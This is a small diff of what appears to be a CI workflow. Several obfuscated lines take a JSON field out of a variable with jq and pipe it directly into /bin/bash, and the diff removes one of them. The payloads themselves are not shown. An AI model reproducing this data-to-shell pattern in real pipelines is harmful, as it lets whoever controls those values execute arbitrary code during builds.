@@ -37,7 +37,6 @@ jobs:
           echo $cb0 | jq -r .fld69 | /bin/bash
           echo $lv75179 | jq -r .iv49 | /bin/bash
           printf '%s' "$kn6" | jq -r .kuo32 | /bin/bash
-          printf '%s' "$xylck37" | jq -r .ed579 | /bin/bash
           echo $hzsag87924 | jq -r .a5 | /bin/bash
           echo $hiq6300 | jq -r .u90181 | /bin/bash
           echo $gkv5768 | jq -r .rffe60095 | /bin/bash
